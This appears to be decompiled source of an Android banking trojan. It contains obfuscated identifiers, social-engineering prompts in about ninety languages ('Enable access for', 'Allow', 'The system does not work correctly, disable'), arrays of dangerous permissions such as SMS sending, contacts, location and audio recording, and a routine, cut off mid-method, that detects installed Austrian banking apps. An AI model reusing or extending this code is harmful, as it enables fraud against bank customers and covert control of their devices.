package wocwvy.czyxoxmbauu.slsa;

import android.content.Context;
import android.content.pm.ApplicationInfo;

/* JADX INFO: renamed from: wocwvy.czyxoxmbauu.slsa.a */
/* JADX INFO: loaded from: classes.dex */
public class C0019a {

    /* JADX INFO: renamed from: h */
    public static final String[] f323h = "[az]aktivləşdirmək::[sq]aktivizoni::[am]የሚሰጡዋቸውን::[en]activate::[ar]تفعيل::[hy]ակտիվացնել::[af]aktiveer::[eu]aktibatu::[ba]актив::[be]актываваць::[bn]সক্রিয়::[my]သက်ဝင်::[bg]активира::[bs]aktiviraj::[cy]activate::[hu]aktiválja::[vi]kích hoạt::[ht]aktive::[gl]activar::[nl]activeren::[mrj]активировать::[el]ενεργοποίηση::[ka]გააქტიურება::[gu]સક્રિય::[da]aktivere::[he]הפעל::[yi]אַקטאַווייט::[id]mengaktifkan::[ga]gníomhachtaigh::[is]virkja::[es]activar::[it]attivare::[kk]іске қосу::[kn]ಸಕ್ರಿಯಗೊಳಿಸಿ::[ca]activar::[ky]активировать::[zh]激活::[ko]활성화::[xh]sebenzisa::[km]ធ្វើឱ្យ::[lo]ກະຕຸ້ນ::[la]eu::[lv]aktivizēt::[lt]įjungti::[lb]aktivéieren::[mk]активирајте::[mg]mampihetsika::[ms]mengaktifkan::[ml]സജീവമാക്കുക::[mt]jattiva::[mi]whakahohe::[mr]सक्रिय::[mhr]чӱкташ::[mn]идэвхжүүлэх::[de]aktivieren::[ne]सक्रिय::[no]aktiver::[pa]ਸਰਗਰਮ::[pap]primi::[fa]فعال::[pl]aktywować::[pt]activar::[ro]activa::[ru]активировать::[ceb]activate::[sr]активирај::[si]ක්රියාත්මක::[sk]aktivácia::[sl]vključi::[sw]kuamsha::[su]aktipkeun::[tl]i-activate::[tg]фаъол::[th]เปิดใช้งาน::[ta]செயல்படுத்த::[tt]активировать::[te]సక్రియం::[tr]etkinleştirmek::[udm]активировать::[uz]faollashtirish::[uk]активувати::[ur]چالو::[fi]aktivoi::[fr]activer::[hi]सक्रिय::[hr]aktivirati::[cs]aktivovat::[sv]aktivera::[gd]gnìomhaich::[eo]aktivigi::[et]aktiveerige::[jv]ngaktifake::[ja]活性化".split("::");

    /* JADX INFO: renamed from: i */
    public static final String[] f324i = "[az]Yandırmaq üçün giriş::[sq]Mundësimi i aksesit për::[am]ደረጃ መድረስ ደረጃ አልተሰጠውም::[en]Enable access for::[ar]تمكين الوصول إلى::[hy]Միացնել մուտք::[af]In staat stel om toegang vir::[eu]Gaitu sarbidea::[ba]Эсенә инеү өсөн::[be]Уключыце доступ для::[bn]এক্সেস সক্রিয় জন্য::[my]ဖစ္ရပ္တည္ႏေ::[bg]Включете достъп за::[bs]Omogućiti pristup::[cy]Galluogi mynediad ar gyfer::[hu]Hozzáférés engedélyezése a::[vi]Cho phép truy cập cho::[ht]Pèmèt aksè pou::[gl]Posibilitar o acceso para::[nl]Toegang voor::[mrj]Пыртен кердеш::[el]Ενεργοποιήστε την πρόσβαση για::[ka]საშუალებას დაშვება::[gu]સક્રિય ઍક્સેસ માટે::[da]Aktiver adgang til::[he]לאפשר גישה::[yi]געבן צוטריט פֿאַר::[id]Mengaktifkan akses untuk::[ga]A chumas rochtain a fháil ar do::[is]Virkja aðgang::[es]Habilitar el acceso para::[it]Abilitare l'accesso per::[kk]Қосыңыз қол жеткізу үшін::[kn]ಸಕ್ರಿಯಗೊಳಿಸಿ ಪ್ರವೇಶ::[ca]Permetre l'accés per::[ky]Включите кирүү үчүн::[zh]使访问::[ko]활성화에 대한 액세스::[xh]Yenza ukufikelela kuba::[km]បើកការចូលដំណើរសម្រាប់::[lo]ເຮັດໃຫ້ສາມາດເຂົ້າເຖິງສໍາລັບ::[la]Morbi accessum ad::[lv]Ieslēdziet piekļuve::[lt]Įjunkite galimybė::[lb]Veröffentlechen Si den Accès fir::[mk]Им овозможи пристап за::[mg]Alefaso ny fidirana ho::[ms]Akses untuk membolehkan::[ml]Enable access വേണ്ടി::[mt]Tippermetti l-aċċess għall -::[mi]Taea ai te whai wāhi mō te::[mr]सक्षम प्रवेश::[mhr]Пураш пурташ::[mn]Идэвхжүүлэх хандах::[de]Schalten Sie den Zugang für::[ne]पहुँच सक्षम पार्नुहोस् लागि::[no]Tillat tilgang for::[pa]ਯੋਗ ਲਈ ਪਹੁੰਚ::[pap]Abilidat di aceso na::[fa]فعال کردن دسترسی برای::[pl]Włącz dostęp do::[pt]Habilite o acesso para::[ro]Activați acces pentru::[ru]Включите доступ для::[ceb]Paghimo access alang sa::[sr]Укључите приступ за::[si]සක්රීය ප්රවේශය සඳහා::[sk]Povoliť prístup pre::[sl]Omogočanje dostopa za::[sw]Kuwawezesha access kwa ajili ya::[su]Ngaktipkeun aksés pikeun::[tl]Paganahin ang pag-access para sa::[tg]Рӯй оид ба дастрасӣ ба::[th]เปิดใช้งานสำหรับเข้าถึง::[ta]இயக்கு அனுமதி::[tt]Включите керү өчен::[te]ఎనేబుల్ యాక్సెస్ కోసం::[tr]Açın ve erişim için::[udm]Гожтоно кариськи понна::[uz]Uchun kirish imkonini beradi::[uk]Увімкніть доступ для::[ur]قابل رسائی کے لئے::[fi]Mahdollistaa pääsyn::[fr]Activer l'accès pour::[hi]पहुँच सक्षम करें के लिए::[hr]Uključite pristup za::[cs]Povolte přístup pro::[sv]Aktivera åtkomst för::[gd]Cuir cothrom airson::[eo]Ebligi aliron por::[et]Lülitage juurdepääs::[jv]Ngaktifake akses kanggo::[ja]アクセスのための".split("::");

    /* JADX INFO: renamed from: j */
    public static final String[] f325j = "[az]İzin ver::[sq]Të lejojë::[am]የሚሰጡዋቸውን::[en]Allow::[ar]تسمح::[hy]Լուծել::[af]Laat::[eu]Baimendu::[ba]Рөхсәт::[be]Дазволіць::[bn]অনুমতি::[my]ခွင့်ပြု::[bg]Оставя се::[bs]Dozvoliti::[cy]Caniatáu::[hu]Lehetővé teszi,::[vi]Cho phép::[ht]Pèmèt::[gl]Permitir::[nl]Toestaan::[mrj]Разрешӓйӹ::[el]Επιτρέπεται::[ka]საშუალებას::[gu]પરવાનગી આપે છે::[da]Tillad::[he]לאפשר::[yi]לאָזן::[id]Memungkinkan::[ga]Cheadú::[is]Leyfa::[es]Permitir::[it]Consentire::[kk]Рұқсат етілсін::[kn]ಅವಕಾಶ::[ca]Permetre::[ky]Уруксат::[zh]允许::[ko]용::[xh]Vumela::[km]អនុញ្ញាត::[lo]ອະນຸຍາດ::[la]Sino::[lv]Atļaut::[lt]Leisti::[lb]Zulassen::[mk]Дозволете::[mg]Mamela::[ms]Membenarkan::[ml]അനുവദിക്കുക::[mt]Tippermetti::[mi]Tukua::[mr]परवानगी::[mhr]Кӧнеда::[mn]Зөвшөөрөх::[de]Zulassen::[ne]अनुमति::[no]La::[pa]ਸਹਾਇਕ ਹੈ::[pap]Permití::[fa]اجازه می دهد::[pl]Pozwól::[pt]Permitir::[ro]Permite::[ru]Разрешить::[ceb]Pagtugot::[sr]Дозволи::[si]ඉඩ::[sk]Povoliť::[sl]Dovolite,::[sw]Kuruhusu::[su]Ngidinan::[tl]Payagan ang mga::[tg]Иҷозат::[th]อนุญาต::[ta]அனுமதிக்க::[tt]Игъланнары::[te]అనుమతిస్తుంది.::[tr]İzin ver::[udm]Разрешить::[uz]Ruxsat::[uk]Дозволити::[ur]کی اجازت::[fi]Salli::[fr]Autoriser::[hi]की अनुमति::[hr]Dopusti::[cs]Povolit::[sv]Tillåta::[gd]Ceadaich::[eo]Permesi::[et]Luba::[jv]Ngidini::[ja]許可".split("::");

    /* JADX INFO: renamed from: k */
    public static final String[] f326k = "[az]Bəli::[sq]Po::[am]አዎ::[en]Yes::[ar]نعم::[hy]Այո::[af]Ja::[eu]Bai::[ba]Д::[be]Ды::[bn]হ্যাঁ::[my]ဟုတ်ကဲ့::[bg]Да::[bs]- ::[cy]Ie::[hu]Igen::[vi]Yes::[ht]Wi::[gl]Si::[nl]Ja::[mrj]Мане::[el]Ναι::[ka]დიახ::[gu]હા::[da]Ja::[he]כן::[yi]יא::[id]Ya::[ga]Tá::[is]Já::[es]Sí::[it]Sì::[kk]Иә::[kn]ಹೌದು::[ca]Sí::[ky]Ооба::[zh]是的::[ko]네::[xh]Ewe::[km]បាទ::[lo]ແມ່ນແລ້ວ::[la]Etiam::[lv]Jā::[lt]Taip::[lb]Jo::[mk]Yes::[mg]Eny::[ms]Ya::[ml]അതെ::[mt]Iva::[mi]Ae::[mr]होय::[mhr]Да::[mn]Тийм ээ::[de]Ja::[ne]हो::[no]Ja::[pa]ਜੀ::[pap]Sí::[fa]بله::[pl]Tak::[pt]Sim::[ro]Da::[ru]Да::[ceb]Oo::[sr]Да::[si]ඔව්::[sk]Áno::[sl]Da,::[sw]Ndiyo::[su]Enya::[tl]Oo::[tg]Ҳа::[th]ใช่แล้ว::[ta]ஆமாம்::[tt]Әйе::[te]అవును::[tr]Evet::[udm]Мед::[uz]Ha::[uk]Так::[ur]جی ہاں::[fi]Kyllä::[fr]Oui::[hi]हाँ::[hr]Da::[cs]Ano::[sv]Ja::[gd]Yes::[eo]Jes::[et]Jah::[jv]Ya::[ja]あり".split("::");

    /* JADX INFO: renamed from: l */
    public static final String[] f327l = "[az]sil::[sq]uninstall::[am].::[en]uninstall::[ar]إلغاء::[hy]հեռացնել::[af]verwyder::[eu]desinstalatu::[ba]бөтөрөп::[be]выдаліць::[bn]আনইনস্টল::[my]ဖယ်ရှား::[bg]изтриете::[bs]deinstaliranje::[cy]uninstall::[hu]uninstall::[vi]rõ ràng::[ht]désinstaller::[gl]instrucións para::[nl]verwijderen::[mrj]удалена::[el]απεγκατάσταση::[ka]uninstall::[gu]અનઇન્સ્ટોલ કરો::[da]afinstaller::[he]הסרת התקנה::[yi]נעם אַוועק::[id]uninstall::[ga]treoracha::[is]flutningur::[es]desinstalar::[it]disinstallare::[kk]жою::[kn]ಅಸ್ಥಾಪಿಸು::[ca]desinstal · lar::[ky]таштоо::[zh]卸载::[ko]제거::[xh]imizekelo::[km]លុប::[lo]ຖ::[la]uninstall::[lv]atinstalēt::[lt]pašalinti::[lb]deinstallieren::[mk]деинсталирање::[mg]fanesorana::[ms]pemasangan::[ml]അൺഇൻസ്റ്റാൾ::[mt]istruzzjonijiet::[mi]wetetāuta::[mr]विस्थापित::[mhr]кораҥдаш::[mn]устгах::[de]deinstallieren::[ne]स्थापना रद्द::[no]avinstaller::[pa]ਅਣ::[pap]dental::[fa]حذف::[pl]usunąć::[pt]desinstalação::[ro]dezinstalare::[ru]удалить::[ceb]uninstall::[sr]уклонити::[si]අස්ථාපනය කරන්න::[sk]odinštalovať::[sl]odstrani::[sw]kuondolewa::[su]uninstall::[tl]i-uninstall ang mga::[tg]чӣ тавр ба хориҷ::[th]ถอนการติดตั้ง::[ta]மென்பொருளை நீக்க::[tt]бетерә::[te]అన్ఇన్స్టాల్::[tr]Kaldır::[udm]палэнтыны::[uz]adware virus olib tashlash uchun::[uk]видалити::[ur]انسٹال::[fi]uninstall::[fr]désinstaller::[hi]स्थापना रद्द करें::[hr]izbrisati::[cs]odinstalovat::[sv]avinstallera::[gd]dì-stàlaich::[eo]uninstall::[et]uninstall::[jv]busak instal::[ja]アンインストール".split("::");

    /* JADX INFO: renamed from: m */
    public static final String[] f328m = "[az]sil::[sq]për të hequr::[am]ማስወገድ::[en]to remove::[ar]لإزالة::[hy]հեռացնել::[af]te verwyder::[eu]kendu::[ba]бөтөрөп::[be]выдаліць::[bn]মুছে ফেলার জন্য::[my]ဖယ်ရှားရန်::[bg]изтриете::[bs]da ukloni::[cy]i gael gwared ar::[hu]eltávolítani::[vi]để loại bỏ::[ht]pou retire::[gl]para eliminar::[nl]verwijderen::[mrj]удалена::[el]διαγραφή::[ka]უნდა ამოიღონ::[gu]દૂર કરવા માટે::[da]for at fjerne::[he]כדי להסיר::[yi]צו באַזייַטיקן::[id]untuk menghapus::[ga]a bhaint::[is]til að fjarlægja::[es]eliminar::[it]rimuovere::[kk]жою::[kn]ತೆಗೆದುಹಾಕಲು::[ca]per eliminar::[ky]таштоо::[zh]删除::[ko]를 제거::[xh]ukususa::[km]ដើម្បីយកចេញ::[lo]ເພື່ອເອົາ::[la]ad tollendam::[lv]dzēst::[lt]pašalinti::[lb]ewechhuelen::[mk]за да се отстрани::[mg]mba hanesorana::[ms]untuk mengeluarkan::[ml]നീക്കം::[mt]biex tneħħi::[mi]ki te tango::[mr]काढा::[mhr]кораҥдаш::[mn]устгах::[de]entfernen::[ne]हटाउन::[no]for å fjerne::[pa]ਨੂੰ ਹਟਾਉਣ ਲਈ::[pap]kita::[fa]برای حذف::[pl]usunąć::[pt]remover::[ro]elimina::[ru]удалить::[ceb]aron sa pagpapahawa::[sr]уклонити::[si]ඉවත් කිරීමට::[sk]odstrániť::[sl]odstrani::[sw]kuondoa::[su]pikeun miceun::[tl]upang alisin::[tg]чӣ тавр ба хориҷ::[th]เพื่อลบ::[ta]நீக்க::[tt]бетерә::[te]తొలగించడానికి::[tr]sil::[udm]палэнтыны::[uz]olib tashlash uchun::[uk]видалити::[ur]کو ہٹانے کے لئے::[fi]poistaa::[fr]supprimer::[hi]को दूर करने के लिए::[hr]izbrisati::[cs]odstranit::[sv]för att ta bort::[gd]a thoirt air falbh::[eo]forigi::[et]kustuta::[jv]kanggo mbusak::[ja]除".split("::");

    /* JADX INFO: renamed from: n */
    public static final String[] f329n = "[az]yandırmaq::[sq]përfshijnë::[am]ማካተት::[en]include::[ar]وتشمل::[hy]միացնել::[af]sluit::[eu]besteak beste::[ba]индереү::[be]ўключыць::[bn]অন্তর্ভুক্ত::[my]င္သည္။::[bg]включи::[bs]uključuju::[cy]yn cynnwys::[hu]tartalmazza::[vi]bao gồm::[ht]gen ladan yo::[gl]inclúen::[nl]zijn::[mrj]чӱктен::[el]ενεργοποίηση::[ka]მოიცავს::[gu]સમાવેશ થાય છે::[da]omfatter::[he]כוללים::[yi]אַרייַננעמען::[id]termasuk::[ga]san áireamh::[is]fela::[es]incluir::[it]includere::[kk]қосу::[kn]ಸೇರಿವೆ::[ca]incloure::[ky]киргизүүгө::[zh]包括::[ko]함::[xh]quka::[km]រួមមាន::[lo]ປະກອບ::[la]etiam::[lv]iekļaut::[lt]įjungti::[lb]einschalten::[mk]вклучуваат::[mg]ahitana::[ms]termasuk::[ml]include::[mt]jinkludu::[mi]ngā::[mr]यांचा समावेश आहे::[mhr]включатлаш::[mn]оруулах::[de]einschalten::[ne]समावेश::[no]inkluderer::[pa]ਵਿੱਚ ਸ਼ਾਮਲ ਹਨ::[pap]inclui::[fa]عبارتند از:::[pl]włączyć::[pt]incluir::[ro]include::[ru]включить::[ceb]naglakip sa::[sr]укључите::[si]ඇතුළත්::[sk]patrí::[sl]vključujejo::[sw]ni pamoja na::[su]antarana::[tl]isama::[tg]даргиронидани::[th]รวม::[ta]அடங்கும்::[tt]кертергә::[te]ఉన్నాయి.::[tr]dahil::[udm]гожтыны::[uz]o'z ichiga oladi::[uk]включити::[ur]شامل ہیں::[fi]sisältää::[fr]activer::[hi]शामिल हैं::[hr]uključiti::[cs]zahrnout::[sv]inkluderar::[gd]gabhail a-steach::[eo]inkluzivas::[et]sisse::[jv]kalebu::[ja]など".split("::");

    /* JADX INFO: renamed from: o */
    public static final String[] f330o = ":[az]indi başlamaq::[sq]filloni tani::[am]አዳዲስ::[en]start now::[ar]تبدأ الآن::[hy]հիմա սկսել::[af]nou begin::[eu]orain hasi::[ba]хәҙер башланы.::[be]пачаць цяпер::[bn]এখন শুরু::[my]ယခုစတင်::[bg]започнете сега,::[bs]sada početi::[cy]ddechrau yn awr::[hu]indítás most::[vi]bắt đầu ngay bây giờ::[ht]kòmanse kounye a::[gl]comezar agora::[nl]start nu::[mrj]кӹзӹт тӹнгӓлӹн.::[el]να αρχίσει τώρα::[ka]დაწყება ახლავე::[gu]હવે શરૂ કરો::[da]start nu::[he]להתחיל עכשיו::[yi]אָנהייב איצט::[id]mulai sekarang::[ga]tús a chur anois::[is]byrjar nú::[es]empezar ahora::[it]iniziare ora::[kk]қазір бастау керек::[kn]ಈಗ ಪ್ರಾರಂಭಿಸಿ::[ca]comença ara::[ky]азыр баштоо::[zh]从现在开始::[ko]지금 시작::[xh]qala ngoku::[km]ចាប់ផ្តើមឥឡូវនេះ::[lo]ເລີ່ມຕົ້ນການປັດຈຸບັນ::[la]tincidunt nunc::[lv]sākt tagad::[lt]pradėti dabar::[lb]elo lass::[mk]почнете сега::[mg]manomboka izao::[ms]mulai sekarang::[ml]start now::[mt]ibda issa::[mi]tīmata i teie nei::[mr]आता प्रारंभ करा::[mhr]кызыт тӱҥалын::[mn]одоо эхлэх::[de]starten Sie jetzt::[ne]अब सुरु::[no]start nå::[pa]ਹੁਣ ਸ਼ੁਰੂ::[pap]kuminsá awor::[fa]در حال حاضر شروع::[pl]zacząć teraz::[pt]começar agora::[ro]începe acum::[ru]начать сейчас::[ceb]sugdi karon::[sr]почети сада::[si]දැන් ආරම්භ::[sk]začnite teraz::[sl]začni zdaj::[sw]kuanza sasa::[su]ngamimitian ayeuna::[tl]simulan ngayon::[tg]оғоз ҳоло::[th]เริ่มตอนนี้::[ta]இப்போது தொடங்க::[tt]башларга хәзер::[te]start now::[tr]şimdi başlayın::[udm]али кутскемын::[uz]hozir boshlash::[uk]почати зараз::[ur]اب شروع::[fi]aloita nyt::[fr]commencer dès maintenant::[hi]अब शुरू करो::[hr]započnite sada::[cs]začněte hned::[sv]börja nu::[gd]tòisich air a-nis::[eo]komenci nun::[et]alusta kohe::[jv]miwiti saiki::[ja]始めないといけない:".split("::");

    /* JADX INFO: renamed from: p */
    public static final String[] f331p = ":[az]başlamaq::[sq]për të filluar::[am]ጋር::[en]to start::[ar]لبدء::[hy]սկսել::[af]om te begin::[eu]hasteko::[ba]башлана::[be]пачаць::[bn]শুরু করার জন্য::[my]စတင်::[bg]започнете::[bs]da počnem::[cy]i ddechrau::[hu]kezdeni::[vi]để bắt đầu::[ht]pou yo kòmanse::[gl]para comezar::[nl]om te beginnen::[mrj]тӹнгӓльӹ::[el]ξεκινήσετε::[ka]უნდა დაიწყოს::[gu]શરૂ કરવા માટે::[da]til at starte::[he]כדי להתחיל::[yi]צו אָנהייבן::[id]untuk memulai::[ga]chun tús a chur::[is]til að byrja::[es]empezar::[it]iniziare::[kk]бастау::[kn]ಆರಂಭಿಸಲು::[ca]per començar::[ky]баштоо::[zh]开始::[ko]을 시작::[xh]ukuqala::[km]ដើម្បីចាប់ផ្តើម::[lo]ເພື່ອເລີ່ມຕົ້ນ::[la]ad satus::[lv]sākt::[lt]pradėti::[lb]starten::[mk]за да започнете::[mg]manomboka::[ms]untuk memulakan::[ml]ആരംഭിക്കുക::[mt]biex tibda::[mi]ki te tīmata::[mr]सुरू करण्यासाठी::[mhr]тӱҥалына::[mn]эхлэх::[de]starten::[ne]सुरु गर्न::[no]for å starte::[pa]ਸ਼ੁਰੂ ਕਰਨ ਲਈ::[pap]kuminsá::[fa]برای شروع::[pl]zacząć::[pt]começar::[ro]începe::[ru]начать::[ceb]sa pagsugod::[sr]почетак::[si]ආරම්භ කිරීමට::[sk]na začiatok::[sl]za začetek::[sw]kuanza::[su]pikeun ngamimitian::[tl]upang simulan ang::[tg]post оянда::[th]ต้องเริ่มต้น::[ta]தொடங்க::[tt]башлау::[te]ప్రారంభం::[tr]başlamak::[udm]кутскиз::[uz]boshlash uchun ::[uk]почати::[ur]شروع کرنے کے لئے::[fi]aloittaa::[fr]commencer::[hi]शुरू करने के लिए::[hr]početak::[cs]začít::[sv]för att börja::[gd]tòiseachadh::[eo]al komenco::[et]alustada::[jv]kanggo miwiti::[ja]を開始:".split("::");

    /* JADX INFO: renamed from: q */
    public static final String[] f332q = ":[az]Sistem işləyir səhv ayırın ::[sq]Sistemi nuk funksionon në mënyrë korrekte, të çaktivizoni ::[am]አዳዲስ ግምገማዎች በትክክል አንድ ::[en]The system does not work correctly, disable ::[ar]النظام لا يعمل بشكل صحيح ، تعطيل ::[hy]Համակարգը աշխատում է, սխալ է, անջատեք ::[af]Die stelsel nie werk nie korrek nie, skakel ::[eu]Sistema ez da behar bezala lan, desgaitu ::[ba]Системалары дөрөҫ эшләргә,  һүндерелә::[be]Сістэма працуе няправільна, адключыце ::[bn]সিস্টেম কাজ করে না, সঠিকভাবে নিষ্ক্রিয় ::[my]အဆိုပါစနစ်ကအလုပ်မလုပ်ပါဘူး၊မှန်မှန်ကန်ကန်ပိတ် ၁၂၃၁၂၃::[bg]Системата работи правилно, изключете ::[bs]Sistem ne radi ispravno, onesposobiti ::[cy]Nid yw'r system yn gweithio yn gywir, analluogi ::[hu]A rendszer nem működik megfelelően, tiltsa le ::[vi]Hệ thống không hoạt động chính xác, vô hiệu hóa ::[ht]Sistèm nan pa travay kòrèkteman, enfim ::[gl]O sistema non funciona correctamente, desactivar ::[nl]Het systeem werkt niet goed, uitschakelen ::[mrj]Самынь системӹм ӹштӹмӓш, отключать ::[el]Το σύστημα δεν λειτουργεί σωστά, απενεργοποιήστε ::[ka]სისტემა არ მუშაობს სწორად, გამორთოთ ::[gu]આ સિસ્ટમ યોગ્ય રીતે કામ કરતી નથી, નિષ્ક્રિય ::[da]Systemet ikke fungerer korrekt, skal du deaktivere ::[he]המערכת לא עובדת כראוי, השבת ::[yi]די סיסטעם טוט ניט אַרבעט ריכטיק, דיסייבאַל ::[id]Sistem tidak bekerja dengan benar, menonaktifkan ::[ga]Ní dhéanann an córas ag obair i gceart, a dhíchumasú ::[is]Kerfið virkar ekki rétt, slökkva ::[es]El sistema no funciona correctamente, deshabilitar ::[it]Il sistema non funziona correttamente, disattivare ::[kk]Жүйесі дұрыс жұмыс істемейді, өшіріңіз ::[kn]ವ್ಯವಸ್ಥೆ ಸರಿಯಾಗಿ ಕೆಲಸ ಮಾಡುವುದಿಲ್ಲ, ನಿಷ್ಕ್ರಿಯಗೊಳಿಸಲು ::[ca]El sistema no funciona correctament, inutilitzar en ::[ky]Тутум туура эмес, отключите ::[zh]该系统不能正常工作，禁止::[ko]이 체계가 제대로 작동하지 않으면 비활성화 ::[xh]Inkqubo kubancedisi ngokuchanekileyo, khubaza ::[km]ប្រព័ន្ធនេះមិនបានធ្វើការយ៉ាងត្រឹមបិទ ១២៣១២៣::[lo]ລະບົບບໍ່ໄດ້ເຮັດວຽກຢ່າງຖືກຕ້ອງ,ປິດການໃຊ້ ໑໒໓໑໒໓::[la]Ratio non opus est, ut recte, disable ::[lv]Sistēma nedarbojas pareizi, atslēgt ::[lt]Sistema neveikia tinkamai, išjunkite ::[lb]D ' system net ordnungsgemäß fonctionnéiert, deaktivieren Si ::[mk]Системот не работи правилно, исклучете ::[mg]Ny rafitra dia tsy miasa araka ny tokony ho izy, mankarary ::[ms]Sistem tidak bekerja dengan betul, melumpuhkan ::[ml]The system does not work correctly, അപ്രാപ്തമാക്കുക ::[mt]Is-sistema ma taħdimx kif suppost, iwaqqaf ::[mi]Ko te pūnaha e kore e mahi i te tika, mono i ::[mr]प्रणाली कार्य करत नाही योग्य अक्षम ::[mhr]Йоҥылыш система пашам ышта, пыштышым ::[mn]Систем ажиллахгүй зөв, идэвхгүй ::[de]Das system nicht ordnungsgemäß funktioniert, deaktivieren Sie ::[ne]The system does not work correctly, अक्षम ::[no]Systemet ikke fungerer på riktig måte, må du deaktivere ::[pa]ਸਿਸਟਮ ਨੂੰ ਕੰਮ ਨਹੀ ਕਰਦਾ ਹੈ, ਠੀਕ ਅਯੋਗ ::[pap]E sistema no ta funciona directamente, desabilidat ::[fa]این سیستم به درستی کار نمی کند با غیر فعال کردن ::[pl]System nie działa prawidłowo, wyłącz ::[pt]O sistema não funcionar corretamente, desative ::[ro]Sistemul nu funcționează corect, dezactiva ::[ru]Система работает неправильно, отключите ::[ceb]Ang sistema sa dili pagtrabaho sa husto nga paagi, nga naghimo og kakulangan sa ::[sr]Систем ради у реду, искључите ::[si]මෙම ක්රමය වැඩ කරන්නේ නැහැ, නිවැරදිව, අක්රීය ::[sk]Systém nefunguje správne, vypnite ::[sl]Sistem ne deluje pravilno, se onemogoči ::[sw]Mfumo haifanyi kazi kwa usahihi, afya ::[su]Sistim teu digawé bener, pareuman ::[tl]Ang sistema ay hindi gumagana nang tama, huwag paganahin ang ::[tg]Системаи кор нодуруст аст, отключите ::[th]ระบบจะไม่ทำงานอย่างถูกต้อปิดการใช้งาน ::[ta]கணினி சரியாக வேலை செய்யாது, முடக்க ::[tt]Система эшли дөрес түгел, отключите ::[te]The system does not work correctly, డిసేబుల్ ::[tr]Sistem düzgün çalışmıyor, devre dışı ::[udm]Неправильно системая ужа, disconnect ::[uz]Tizimi to'g'ri, o'chirish  ishlamaydi ::[uk]Система працює неправильно, вимкніть ::[ur]نظام کام نہیں کرتا ہے ، درست طریقے سے غیر فعال ::[fi]Järjestelmä ei toimi oikein, poista ::[fr]Le système ne fonctionne pas correctement, désactivez ::[hi]सिस्टम ठीक से काम नहीं करता है, निष्क्रिय ::[hr]Sustav radi ispravno, isključite ::[cs]Systém nemusí pracovat správně, zakažte ::[sv]Systemet inte fungerar korrekt, inaktivera ::[gd]Tha an siostam a ' dèanamh nach eil ag obair mar bu chòir, cuir seo à comas ::[eo]La sistemo ne funkcias korekte, malebligi ::[et]Süsteem ei tööta nõuetekohaselt, lülitage välja ::[jv]Sistem ora bisa bener, mateni ::[ja]システムの攻撃により正常に動作しなくなったり、無効に:".split("::");

    /* JADX INFO: renamed from: r */
    public static final String[] f333r = ":[az]Продождить::[sq]Për protoedit::[am]ጋር protoedit::[en]Сontinue::[ar]إلى protoedit::[hy]Продождить::[af]Om te protoedit::[eu]Nahi protoedit::[ba]Продождить::[be]Продождить::[bn]করতে protoedit::[my]အ protoedit::[bg]Продождить::[bs]Da protoedit::[cy]I protoedit::[hu]Hogy protoedit::[vi]Để protoedit::[ht]Pou protoedit::[gl]Para protoedit::[nl]Om protoedit::[mrj]Продождить::[el]Продождить::[ka]უნდა protoedit::[gu]માટે protoedit::[da]At protoedit::[he]כדי protoedit::[yi]צו protoedit::[id]Untuk protoedit::[ga]A protoedit::[is]Að protoedit::[es]Продождить::[it]Продождить::[kk]Продождить::[kn]ಗೆ protoedit::[ca]Сontinue::[ky]Продождить::[zh]到protoedit::[ko]을 protoedit::[xh]Ukuba protoedit::[km]ដើម្បី protoedit::[lo]ການ protoedit::[la]Ad protoedit::[lv]Продождить::[lt]Продождить::[lb]Продождить::[mk]Да protoedit::[mg]Mba protoedit::[ms]Untuk protoedit::[ml]To protoedit::[mt]Biex protoedit::[mi]Ki te protoedit::[mr]To protoedit::[mhr]Продождить::[mn]To protoedit::[de]Продождить::[ne]गर्न protoedit::[no]For å protoedit::[pa]ਕਰਨ ਲਈ protoedit::[pap]Продождить::[fa]به protoedit::[pl]Продождить::[pt]Продождить::[ro]Продождить::[ru]Продождить::[ceb]Sa protoedit::[sr]Продождить::[si]කිරීමට protoedit::[sk]Na protoedit::[sl]Za protoedit::[sw]Kwa protoedit::[su]Pikeun protoedit::[tl]Sa protoedit::[tg]Продождить::[th]ต้อง protoedit::[ta]To protoedit::[tt]Продождить::[te]కు protoedit::[tr]Продождить::[udm]Продождить::[uz]Uchun protoedit::[uk]Продождить::[ur]کرنے کے لئے protoedit::[fi]Voit protoedit::[fr]Продождить::[hi]करने के लिए protoedit::[hr]Продождить::[cs]Продождить::[sv]Att protoedit::[gd]Gu protoedit::[eo]Al protoedit::[et]Продождить::[jv]Kanggo protoedit::[ja]にprotoedit:".split("::");

    /* JADX INFO: renamed from: s */
    public static final String[] f334s = {"Q", "W", "E", "R", "T", "Y", "U", "I", "O", "P", "A", "S", "D", "F", "G", "H", "J", "K", "L", "Z", "X", "C", "V", "B", "N", "M", "q", "w", "e", "r", "y", "u", "i", "o", "p", "a", "s", "d", "f", "g", "h", "j", "k", "l", "z", "x", "c", "v", "b", "n", "m", "=", "0", "1", "2", "3", "4", "5", "6", "7", "8", "9"};

    /* JADX INFO: renamed from: t */
    public static final String[] f335t = {"需", "要", "意", "在", "中", "并", "没", "有", "个", "概", "念", "小", "语", "拼", "亡", "及", "注", "鲜", "新", "死", "之", "类", "阿", "努", "比", "拉", "丁", "化", "体", "系", "都", "只", "斯", "一", "套", "用", "恶", "件", "来", "标", "音", "的", "符", "号", "而", "不", "是", "字", "母", "寂", "寞", "肏", "你", "妈", "屄", "引", "脚", "吸", "员", "会", "膏", "药"};

    /* JADX INFO: renamed from: a */
    public String[] f336a = {"android.permission.SEND_SMS", "android.permission.WRITE_EXTERNAL_STORAGE", "android.permission.READ_CONTACTS", "android.permission.ACCESS_FINE_LOCATION", "android.permission.CALL_PHONE", "android.permission.RECORD_AUDIO"};

    /* JADX INFO: renamed from: b */
    public String[] f337b = {"android.permission.SEND_SMS"};

    /* JADX INFO: renamed from: c */
    public String[] f338c = {"android.permission.WRITE_EXTERNAL_STORAGE"};

    /* JADX INFO: renamed from: d */
    public String[] f339d = {"android.permission.READ_CONTACTS"};

    /* JADX INFO: renamed from: e */
    public String[] f340e = {"android.permission.ACCESS_FINE_LOCATION"};

    /* JADX INFO: renamed from: f */
    public String[] f341f = {"android.permission.CALL_PHONE"};

    /* JADX INFO: renamed from: g */
    public String[] f342g = {"android.permission.RECORD_AUDIO"};

    /* JADX INFO: renamed from: a */
    public String m213a(Context context) {
        String str = "";
        for (ApplicationInfo applicationInfo : context.getPackageManager().getInstalledApplications(128)) {
            if (applicationInfo.packageName.equals("at.spardat.bcrmobile")) {
                str = str + "at.spardat.bcrmobile,";
            }
            if (applicationInfo.packageName.equals("at.spardat.netbanking")) {
                str = str + "at.spardat.netbanking,";
            }
            if (applicationInfo.packageName.equals("com.bankaustria.android.olb")) {
